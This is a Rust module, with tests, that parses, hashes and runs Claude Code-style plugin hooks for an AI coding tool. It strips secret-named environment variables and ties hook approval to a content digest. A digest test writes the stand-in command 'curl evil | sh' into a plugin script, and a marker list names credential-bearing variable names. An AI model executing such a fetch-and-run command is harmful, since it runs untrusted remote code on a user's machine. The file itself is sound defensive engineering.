//! Claude Code-format plugin hooks: parse, fingerprint and run.
//!
//! No TypeScript counterpart. Spec:
//! `docs/superpowers/specs/2026-09-26-plugin-marketplace-design.md`.
//!
//! A hook is a shell command string bound to an event and an optional
//! matcher. It reads one JSON document on stdin in Claude Code's shape. Exit
//! 2 blocks (stderr is the reason); exit 0 may print JSON with `decision`,
//! `continue`, or `hookSpecificOutput`; plain stdout from `SessionStart` and
//! `UserPromptSubmit` is extra context. Any other failure is a non-blocking
//! warning, as in Claude Code. Hooks only run for approved plugins; the
//! approval is tied to [`digest`].

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::{Mutex, OnceLock};
use std::time::Duration;

use regex::Regex;
use serde_json::{json, Value};
use sha2::{Digest, Sha256};

const DEFAULT_TIMEOUT_SECS: u64 = 60;
const OUTPUT_CAP: usize = 64 * 1024;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum HookEvent {
    SessionStart,
    UserPromptSubmit,
    PreToolUse,
    PostToolUse,
    Stop,
    SessionEnd,
}

impl HookEvent {
    pub fn parse(name: &str) -> Option<Self> {
        Some(match name {
            "SessionStart" => Self::SessionStart,
            "UserPromptSubmit" => Self::UserPromptSubmit,
            "PreToolUse" => Self::PreToolUse,
            "PostToolUse" => Self::PostToolUse,
            "Stop" => Self::Stop,
            "SessionEnd" => Self::SessionEnd,
            _ => return None,
        })
    }

    pub fn as_str(self) -> &'static str {
        match self {
            Self::SessionStart => "SessionStart",
            Self::UserPromptSubmit => "UserPromptSubmit",
            Self::PreToolUse => "PreToolUse",
            Self::PostToolUse => "PostToolUse",
            Self::Stop => "Stop",
            Self::SessionEnd => "SessionEnd",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PluginHook {
    pub event: HookEvent,
    pub matcher: Option<String>,
    pub command: String,
    pub timeout_secs: u64,
    pub shell: Option<String>,
    pub is_async: bool,
}

/// Parse `{"hooks": {Event: [{matcher, hooks: [...]}]}}` or the inner map.
pub fn parse_hook_document(doc: &Value, out: &mut Vec<PluginHook>, unsupported: &mut Vec<String>) {
    let events = match doc.get("hooks") {
        Some(inner @ Value::Object(_)) => inner,
        _ => doc,
    };
    let Some(events) = events.as_object() else {
        return;
    };
    for (event_name, groups) in events {
        if event_name == "description" {
            continue;
        }
        let event = HookEvent::parse(event_name);
        for group in groups.as_array().into_iter().flatten() {
            let matcher = group
                .get("matcher")
                .and_then(Value::as_str)
                .map(str::to_string)
                .filter(|m| !m.is_empty() && m != "*");
            for hook in group
                .get("hooks")
                .and_then(Value::as_array)
                .into_iter()
                .flatten()
            {
                let kind = hook
                    .get("type")
                    .and_then(Value::as_str)
                    .unwrap_or("command");
                let command = hook.get("command").and_then(Value::as_str).unwrap_or("");
                match event {
                    Some(event) if kind == "command" && !command.trim().is_empty() => {
                        out.push(PluginHook {
                            event,
                            matcher: matcher.clone(),
                            command: command.to_string(),
                            timeout_secs: hook
                                .get("timeout")
                                .and_then(Value::as_u64)
                                .filter(|secs| *secs > 0)
                                .unwrap_or(DEFAULT_TIMEOUT_SECS),
                            shell: hook
                                .get("shell")
                                .and_then(Value::as_str)
                                .map(str::to_string),
                            is_async: hook.get("async").and_then(Value::as_bool).unwrap_or(false),
                        })
                    }
                    _ => unsupported.push(format!("{event_name} ({kind}): {command}")),
                }
            }
        }
    }
    out.sort_by(|a, b| a.event.cmp(&b.event));
}

/// Files larger than this, and everything under `node_modules`, are
/// fingerprinted by size and modification time instead of content.
const CONTENT_HASH_LIMIT: u64 = 8 * 1024 * 1024;

/// Fingerprint of everything a hook can execute: the hook definitions plus
/// the whole plugin tree except `.git`. A hook runs through a shell and may
/// reach any plugin file (an unbraced `$CLAUDE_PLUGIN_ROOT`, a script that
/// imports a library), so no subset of files is safe to leave out.
pub fn digest(root: &Path, hooks: &[PluginHook]) -> Option<String> {
    if hooks.is_empty() {
        return None;
    }
    let mut hasher = Sha256::new();
    hasher.update(definitions_json(hooks));
    hasher.update([0]);
    hash_tree(root, &mut hasher);
    Some(hex(&hasher.finalize()))
}

/// [`digest`], computed once per process for each plugin root and hook set.
/// Walking a large plugin on every prompt would cost more than the prompt.
/// A change made while a process runs is seen by the next process, and
/// `plugin approve` always hashes afresh.
pub fn digest_cached(root: &Path, hooks: &[PluginHook]) -> Option<String> {
    type Cache = Mutex<BTreeMap<(PathBuf, String), Option<String>>>;
    static CACHE: OnceLock<Cache> = OnceLock::new();
    if hooks.is_empty() {
        return None;
    }
    let key = (root.to_path_buf(), definitions_json(hooks));
    let cache = CACHE.get_or_init(|| Mutex::new(BTreeMap::new()));
    if let Some(found) = cache.lock().unwrap_or_else(|e| e.into_inner()).get(&key) {
        return found.clone();
    }
    let value = digest(root, hooks);
    cache
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .insert(key, value.clone());
    value
}

fn definitions_json(hooks: &[PluginHook]) -> String {
    Value::Array(
        hooks
            .iter()
            .map(|hook| {
                json!([
                    hook.event.as_str(),
                    hook.matcher,
                    hook.command,
                    hook.shell,
                    hook.is_async,
                    hook.timeout_secs
                ])
            })
            .collect(),
    )
    .to_string()
}

fn hash_tree(root: &Path, hasher: &mut Sha256) {
    let walker = walkdir::WalkDir::new(root)
        .follow_links(false)
        .sort_by_file_name()
        .into_iter()
        .filter_entry(|entry| entry.file_name() != ".git");
    for entry in walker {
        let Ok(entry) = entry else {
            hasher.update(b"<unreadable>");
            continue;
        };
        if entry.file_type().is_dir() {
            continue;
        }
        let rel_path = entry.path().strip_prefix(root).unwrap_or(entry.path());
        hasher.update(rel_path.to_string_lossy().replace('\\', "/").as_bytes());
        hasher.update([0]);
        if entry.file_type().is_symlink() {
            let target = std::fs::read_link(entry.path()).unwrap_or_default();
            hasher.update(b"L");
            hasher.update(target.to_string_lossy().as_bytes());
        } else {
            let meta = entry.metadata().ok();
            let size = meta.as_ref().map(|m| m.len()).unwrap_or(0);
            let by_stat = size > CONTENT_HASH_LIMIT
                || rel_path
                    .components()
                    .any(|part| part.as_os_str() == "node_modules");
            if by_stat {
                let modified = meta
                    .and_then(|m| m.modified().ok())
                    .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                    .map(|d| d.as_nanos())
                    .unwrap_or(0);
                hasher.update(format!("S{size}:{modified}").as_bytes());
            } else {
                match std::fs::read(entry.path()) {
                    Ok(bytes) => {
                        hasher.update(b"C");
                        hasher.update(&bytes);
                    }
                    Err(_) => hasher.update(b"<unreadable>"),
                }
            }
        }
        hasher.update([0]);
    }
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().fold(String::new(), |mut out, byte| {
        use std::fmt::Write as _;
        let _ = write!(out, "{byte:02x}");
        out
    })
}

/// Claude Code's name for a DaVinci tool, used for matchers and payloads.
pub fn claude_tool_name(tool: &str) -> String {
    match tool {
        "bash" => "Bash",
        "powershell" => "PowerShell",
        "read" => "Read",
        "write" => "Write",
        "edit" | "apply_patch" => "Edit",
        "grep" => "Grep",
        "find" => "Glob",
        "ls" => "LS",
        "web_fetch" => "WebFetch",
        "web_search" => "WebSearch",
        "todo" => "TodoWrite",
        "agent" => "Task",
        "notebook_edit" => "NotebookEdit",
        other => other,
    }
    .to_string()
}

/// Tool input in Claude Code's shape: `path` also appears as `file_path`.
pub fn claude_tool_input(args: &Value) -> Value {
    let mut input = args.clone();
    if let Some(object) = input.as_object_mut() {
        if let Some(path) = object.get("path").cloned() {
            object.entry("file_path").or_insert(path);
        }
    }
    input
}

/// A matcher is an anchored regex over the Claude tool name (or the
/// `SessionStart` source). An invalid regex falls back to exact text.
pub fn matcher_accepts(matcher: Option<&str>, subject: &str) -> bool {
    let Some(matcher) = matcher else {
        return true;
    };
    match Regex::new(&format!("^(?:{matcher})$")) {
        Ok(regex) => regex.is_match(subject),
        Err(_) => matcher == subject,
    }
}

/// Where and as whom a hook runs.
#[derive(Debug, Clone)]
pub struct HookContext {
    pub plugin_name: String,
    pub plugin_root: PathBuf,
    pub data_dir: PathBuf,
    pub cwd: PathBuf,
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct HookOutcome {
    /// Text for the model: SessionStart / UserPromptSubmit stdout, or any
    /// `additionalContext`.
    pub context: Option<String>,
    /// Set when the hook asked to block.
    pub block: Option<String>,
    /// Non-blocking failure worth surfacing.
    pub warning: Option<String>,
}

/// Interpret a finished hook run the way Claude Code does.
pub fn interpret(
    event: HookEvent,
    exit_code: Option<i32>,
    stdout: &str,
    stderr: &str,
) -> HookOutcome {
    let mut outcome = HookOutcome::default();
    match exit_code {
        Some(0) => {}
        Some(2) => {
            let reason = if stderr.trim().is_empty() {
                stdout
            } else {
                stderr
            };
            outcome.block = Some(reason.trim().to_string())
                .filter(|r| !r.is_empty())
                .or_else(|| Some(format!("blocked by {} hook", event.as_str())));
            return outcome;
        }
        Some(code) => {
            outcome.warning = Some(format!("exit {code}: {}", stderr.trim()));
            return outcome;
        }
        None => {
            outcome.warning = Some("terminated without an exit code".into());
            return outcome;
        }
    }
    let trimmed = stdout.trim();
    if trimmed.starts_with('{') {
        if let Ok(value) = serde_json::from_str::<Value>(trimmed) {
            let text = |key: &str| value.get(key).and_then(Value::as_str).map(str::to_string);
            if value.get("continue").and_then(Value::as_bool) == Some(false) {
                outcome.block = text("stopReason").or_else(|| Some("stopped by hook".into()));
            }
            if value.get("decision").and_then(Value::as_str) == Some("block") {
                outcome.block = text("reason").or_else(|| Some("blocked by hook".into()));
            }
            if let Some(specific) = value.get("hookSpecificOutput") {
                if specific.get("permissionDecision").and_then(Value::as_str) == Some("deny") {
                    outcome.block = specific
                        .get("permissionDecisionReason")
                        .and_then(Value::as_str)
                        .map(str::to_string)
                        .or_else(|| Some("denied by hook".into()));
                }
                outcome.context = specific
                    .get("additionalContext")
                    .and_then(Value::as_str)
                    .map(str::to_string)
                    .filter(|c| !c.trim().is_empty());
            }
            if outcome.context.is_none() {
                outcome.context = text("systemMessage").filter(|m| !m.trim().is_empty());
            }
            return outcome;
        }
    }
    if matches!(event, HookEvent::SessionStart | HookEvent::UserPromptSubmit) && !trimmed.is_empty()
    {
        outcome.context = Some(trimmed.to_string());
    }
    outcome
}

/// Run one hook and interpret its result. `async` hooks are started on a
/// background thread and report nothing.
pub fn run(hook: &PluginHook, ctx: &HookContext, payload: &Value) -> HookOutcome {
    if std::env::var_os("PI_HOOKS_DRY_RUN").is_some() {
        return HookOutcome::default();
    }
    let command = match build_command(hook, ctx) {
        Ok(command) => command,
        Err(warning) => {
            return HookOutcome {
                warning: Some(warning),
                ..HookOutcome::default()
            }
        }
    };
    let input = payload.to_string().into_bytes();
    let limits = davinci_sys::process::RunLimits {
        timeout: Duration::from_secs(hook.timeout_secs),
        output_cap: OUTPUT_CAP,
    };
    if hook.is_async {
        std::thread::spawn(move || {
            let _ = davinci_sys::process::run_bounded(command, Some(input), limits, &|| false);
        });
        return HookOutcome::default();
    }
    match davinci_sys::process::run_bounded(command, Some(input), limits, &|| false) {
        Err(err) => HookOutcome {
            warning: Some(format!("could not start: {err}")),
            ..HookOutcome::default()
        },
        Ok(output) if output.timed_out => HookOutcome {
            warning: Some(format!("timed out after {}s", hook.timeout_secs)),
            ..HookOutcome::default()
        },
        Ok(output) => interpret(
            hook.event,
            output.status.and_then(|status| status.code()),
            &String::from_utf8_lossy(&output.stdout),
            &String::from_utf8_lossy(&output.stderr),
        ),
    }
}

/// Substrings of environment variable names that are never passed to a
/// plugin hook. Deliberately broad: a hook that needs a credential can read
/// its own configuration.
const SECRET_ENV_MARKERS: &[&str] = &[
    "KEY",
    "TOKEN",
    "SECRET",
    "PASSWORD",
    "PASSWD",
    "CREDENTIAL",
    "_PAT",
    "PRIVATE",
    "COOKIE",
    "NETRC",
    "AUTH",
];

/// Names matching a marker that are not secrets and that tools need.
const SAFE_ENV_NAMES: &[&str] = &["SSH_AUTH_SOCK"];

pub fn is_secret_env_name(name: &str) -> bool {
    let upper = name.to_ascii_uppercase();
    !SAFE_ENV_NAMES.contains(&upper.as_str())
        && SECRET_ENV_MARKERS
            .iter()
            .any(|marker| upper.contains(marker))
}

fn wants_powershell(hook: &PluginHook) -> bool {
    hook.shell.as_deref().is_some_and(|shell| {
        shell.eq_ignore_ascii_case("powershell") || shell.eq_ignore_ascii_case("pwsh")
    })
}

fn build_command(hook: &PluginHook, ctx: &HookContext) -> Result<Command, String> {
    let bash = if wants_powershell(hook) {
        None
    } else {
        find_bash()
    };
    build_command_with(hook, ctx, bash)
}

fn build_command_with(
    hook: &PluginHook,
    ctx: &HookContext,
    bash: Option<PathBuf>,
) -> Result<Command, String> {
    let wants_powershell = wants_powershell(hook);
    if !wants_powershell && bash.is_none() {
        // Hook commands are written for bash; cmd.exe would run them with a
        // different quoting and variable syntax.
        return Err(
            "bash not found; install Git for Windows or set DAVINCI_HOOK_BASH to bash.exe".into(),
        );
    }
    let root_text = if bash.is_some() {
        ctx.plugin_root.display().to_string().replace('\\', "/")
    } else {
        ctx.plugin_root.display().to_string()
    };
    let script = hook
        .command
        .replace("${CLAUDE_PLUGIN_ROOT}", &root_text)
        .replace("${DAVINCI_PLUGIN_ROOT}", &root_text)
        .replace("${CLAUDE_PLUGIN_DATA}", &ctx.data_dir.display().to_string())
        .replace("${CLAUDE_PROJECT_DIR}", &ctx.cwd.display().to_string());
    let mut command = if wants_powershell {
        let program = if davinci_sys::process::resolve_program("pwsh") != Path::new("pwsh") {
            "pwsh"
        } else {
            "powershell"
        };
        let mut cmd = Command::new(davinci_sys::process::resolve_program(program));
        cmd.args(["-NoProfile", "-NonInteractive", "-Command", &script]);
        cmd
    } else {
        let mut cmd = Command::new(bash.expect("checked above"));
        cmd.args(["-c", &script]);
        cmd
    };
    command.current_dir(&ctx.cwd);
    for (key, _) in std::env::vars_os() {
        if is_secret_env_name(&key.to_string_lossy()) {
            command.env_remove(&key);
        }
    }
    let _ = std::fs::create_dir_all(&ctx.data_dir);
    command
        .env("CLAUDE_PLUGIN_ROOT", &ctx.plugin_root)
        .env("DAVINCI_PLUGIN_ROOT", &ctx.plugin_root)
        .env("CLAUDE_PLUGIN_DATA", &ctx.data_dir)
        .env("CLAUDE_PROJECT_DIR", &ctx.cwd)
        .env("DAVINCI_HOOK_PLUGIN", &ctx.plugin_name);
    Ok(command)
}

/// Bash for hook scripts. On Windows only Git Bash (or an explicit path)
/// qualifies: `System32\bash.exe` is the WSL launcher, which runs in another
/// filesystem namespace.
fn find_bash() -> Option<PathBuf> {
    for var in ["DAVINCI_HOOK_BASH", "CLAUDE_CODE_GIT_BASH_PATH"] {
        if let Some(path) = std::env::var_os(var).map(PathBuf::from) {
            if path.is_file() {
                return Some(path);
            }
        }
    }
    if !cfg!(windows) {
        return Some(PathBuf::from("bash"));
    }
    let resolved = davinci_sys::process::resolve_program("bash");
    let text = resolved.display().to_string().to_ascii_lowercase();
    if resolved.is_absolute()
        && resolved.is_file()
        && !text.contains("\\system32\\")
        && !text.contains("\\windowsapps\\")
    {
        return Some(resolved);
    }
    for candidate in [
        r"C:\Program Files\Git\bin\bash.exe",
        r"C:\Program Files (x86)\Git\bin\bash.exe",
    ] {
        let path = PathBuf::from(candidate);
        if path.is_file() {
            return Some(path);
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_events_matchers_and_unsupported_entries() {
        let doc = json!({"hooks": {
            "PreToolUse": [{"matcher": "Edit|Write", "hooks": [
                {"type": "command", "command": "fmt", "timeout": 5},
                {"type": "prompt", "prompt": "judge"}
            ]}],
            "SessionStart": [{"matcher": "*", "hooks": [{"command": "hello", "async": true}]}],
            "Notification": [{"hooks": [{"type": "command", "command": "ding"}]}]
        }});
        let mut hooks = Vec::new();
        let mut unsupported = Vec::new();
        parse_hook_document(&doc, &mut hooks, &mut unsupported);
        assert_eq!(hooks.len(), 2);
        assert_eq!(hooks[0].event, HookEvent::SessionStart);
        assert!(hooks[0].is_async);
        assert_eq!(hooks[0].matcher, None);
        assert_eq!(hooks[1].matcher.as_deref(), Some("Edit|Write"));
        assert_eq!(hooks[1].timeout_secs, 5);
        assert_eq!(unsupported.len(), 2);
    }

    #[test]
    fn digest_covers_every_plugin_file_however_it_is_referenced() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join("my scripts/lib")).unwrap();
        std::fs::create_dir_all(root.join(".git")).unwrap();
        std::fs::write(root.join("my scripts/run.sh"), "source lib/util.sh").unwrap();
        std::fs::write(root.join("my scripts/lib/util.sh"), "echo one").unwrap();
        // Unbraced variable and a path with a space: neither is parseable
        // from the command, so the whole tree must be covered.
        let hooks = vec![PluginHook {
            event: HookEvent::SessionStart,
            matcher: None,
            command: "bash \"$CLAUDE_PLUGIN_ROOT/my scripts/run.sh\"".into(),
            timeout_secs: 60,
            shell: None,
            is_async: false,
        }];
        let first = digest(root, &hooks).unwrap();
        assert_eq!(digest(root, &hooks).unwrap(), first);

        std::fs::write(root.join("my scripts/lib/util.sh"), "curl evil | sh").unwrap();
        let second = digest(root, &hooks).unwrap();
        assert_ne!(second, first, "an indirectly used file changed");

        std::fs::write(root.join("new-file.js"), "x").unwrap();
        let third = digest(root, &hooks).unwrap();
        assert_ne!(third, second, "a new file appeared");

        std::fs::write(root.join(".git/HEAD"), "ref").unwrap();
        assert_eq!(digest(root, &hooks).unwrap(), third, ".git is not hashed");
        assert_eq!(digest(root, &[]), None);
    }

    #[test]
    fn secret_like_environment_names_are_withheld() {
        for name in [
            "OPENAI_API_KEY",
            "GITHUB_TOKEN",
            "AWS_SECRET_ACCESS_KEY",
            "SIGNING_KEY",
            "GH_PAT",
            "NETRC",
            "GOOGLE_APPLICATION_CREDENTIALS",
            "npm_config__auth",
            "DB_PASSWD",
        ] {
            assert!(is_secret_env_name(name), "{name}");
        }
        for name in ["PATH", "HOME", "USERPROFILE", "SSH_AUTH_SOCK", "LANG"] {
            assert!(!is_secret_env_name(name), "{name}");
        }
    }

    #[test]
    fn matchers_are_anchored_regexes_over_claude_names() {
        assert!(matcher_accepts(None, "Bash"));
        assert!(matcher_accepts(
            Some("Edit|Write"),
            &claude_tool_name("write")
        ));
        assert!(matcher_accepts(
            Some("Edit|Write"),
            &claude_tool_name("apply_patch")
        ));
        assert!(!matcher_accepts(Some("Edit"), "NotebookEdit"));
        assert!(matcher_accepts(Some("mcp__.*"), "mcp__srv__tool"));
        assert!(matcher_accepts(Some("startup|clear"), "startup"));
        assert!(matcher_accepts(Some("(bad"), "(bad"));
        assert_eq!(claude_tool_name("find"), "Glob");
        assert_eq!(
            claude_tool_input(&json!({"path": "a.rs"}))["file_path"],
            json!("a.rs")
        );
    }

    #[test]
    fn interprets_exit_codes_and_json_output() {
        let blocked = interpret(HookEvent::PreToolUse, Some(2), "", "no secrets\n");
        assert_eq!(blocked.block.as_deref(), Some("no secrets"));

        let denied = interpret(
            HookEvent::PreToolUse,
            Some(0),
            r#"{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"nope"}}"#,
            "",
        );
        assert_eq!(denied.block.as_deref(), Some("nope"));

        let allowed = interpret(
            HookEvent::PreToolUse,
            Some(0),
            r#"{"hookSpecificOutput":{"permissionDecision":"allow"}}"#,
            "",
        );
        assert_eq!(allowed, HookOutcome::default());

        let context = interpret(HookEvent::SessionStart, Some(0), "remember X\n", "");
        assert_eq!(context.context.as_deref(), Some("remember X"));
        let ignored = interpret(HookEvent::PostToolUse, Some(0), "noise", "");
        assert_eq!(ignored.context, None);

        let extra = interpret(
            HookEvent::UserPromptSubmit,
            Some(0),
            r#"{"hookSpecificOutput":{"hookEventName":"UserPromptSubmit","additionalContext":"be brief"}}"#,
            "",
        );
        assert_eq!(extra.context.as_deref(), Some("be brief"));

        let failed = interpret(HookEvent::PreToolUse, Some(1), "", "boom");
        assert_eq!(failed.block, None);
        assert!(failed.warning.unwrap().contains("boom"));
    }

    #[test]
    fn runs_a_command_with_plugin_environment_and_stdin() {
        if find_bash().is_none() {
            // Without bash the hook is refused; that path is covered below.
            return;
        }
        let dir = tempfile::tempdir().unwrap();
        let hook = PluginHook {
            event: HookEvent::SessionStart,
            matcher: None,
            command: "echo \"$CLAUDE_PLUGIN_ROOT\"; cat >/dev/null".into(),
            timeout_secs: 30,
            shell: None,
            is_async: false,
        };
        let ctx = HookContext {
            plugin_name: "demo".into(),
            plugin_root: dir.path().to_path_buf(),
            data_dir: dir.path().join("data"),
            cwd: dir.path().to_path_buf(),
        };
        let outcome = run(&hook, &ctx, &json!({"hook_event_name": "SessionStart"}));
        let context = outcome.context.expect("stdout becomes context");
        let name = dir
            .path()
            .file_name()
            .unwrap()
            .to_string_lossy()
            .to_string();
        assert!(context.contains(&name), "{context}");
        assert!(dir.path().join("data").is_dir());
    }

    #[test]
    fn a_missing_bash_is_a_warning_not_a_cmd_fallback() {
        let dir = tempfile::tempdir().unwrap();
        let hook = PluginHook {
            event: HookEvent::PreToolUse,
            matcher: None,
            command: "exit 2".into(),
            timeout_secs: 5,
            shell: None,
            is_async: false,
        };
        let ctx = HookContext {
            plugin_name: "demo".into(),
            plugin_root: dir.path().to_path_buf(),
            data_dir: dir.path().join("data"),
            cwd: dir.path().to_path_buf(),
        };
        let err = build_command_with(&hook, &ctx, None).unwrap_err();
        assert!(err.contains("bash not found"), "{err}");
        let mut powershell = hook.clone();
        powershell.shell = Some("powershell".into());
        assert!(build_command_with(&powershell, &ctx, None).is_ok());
    }
}
